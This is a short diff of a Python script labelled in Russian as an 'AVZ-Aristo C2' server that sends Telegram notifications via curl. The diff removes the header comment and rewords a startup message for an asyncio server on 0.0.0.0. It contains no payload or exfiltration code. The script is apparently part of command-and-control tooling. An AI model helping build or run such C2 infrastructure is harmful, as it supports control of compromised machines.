@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-# AVZ-Aristo C2 – уведомления в Telegram через curl
 import asyncio, json, os, time, subprocess
 from datetime import datetime
 
@@ -127,7 +126,7 @@ async def handle_client(reader, writer):
 
 async def main():
     server = await asyncio.start_server(handle_client, '0.0.0.0', HTTP_PORT)
-    print(f"[+] C2 (уведомления через curl) на порту {HTTP_PORT}")
+    print(f"[+] C2 (уведомления curl) на порту {HTTP_PORT}")
     async with server:
         await server.serve_forever()
 
